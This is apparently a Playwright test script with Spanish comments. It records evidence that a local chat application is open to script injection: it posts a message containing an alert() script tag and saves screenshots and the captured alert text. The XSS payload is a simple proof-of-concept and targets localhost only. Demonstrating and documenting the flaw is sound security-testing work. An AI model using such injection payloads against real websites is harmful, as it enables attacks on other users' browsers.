// Evidencia 1: demuestra la inyeccion de scripts contra la version vulnerable.
// Guarda captura del chat + el texto del alert() capturado via page.on('dialog').
const { chromium } = require('@playwright/test');
const fs = require('fs');
const path = require('path');
const out = path.resolve(__dirname, '..', '..', 'evidencias');

(async () => {
  const browser = await chromium.launch();
  const page = await browser.newPage({ viewport: { width: 1000, height: 420 } });
  await page.goto('http://localhost:3000');
  await page.fill('#nombre', 'Atacante');
  let alertText = null;
  page.on('dialog', async (d) => { alertText = d.message(); await d.accept(); });
  await page.fill('#m', "<script>alert('Inyección de script');</script>");
  await page.screenshot({ path: path.join(out, 'raw1_antes.png') });
  await page.click('button');
  await page.waitForTimeout(2000);
  await page.screenshot({ path: path.join(out, 'raw1_despues.png') });
  fs.writeFileSync(path.join(out, 'raw1_alert.txt'), String(alertText));
  console.log('ALERT:', alertText);
  await browser.close();
})();
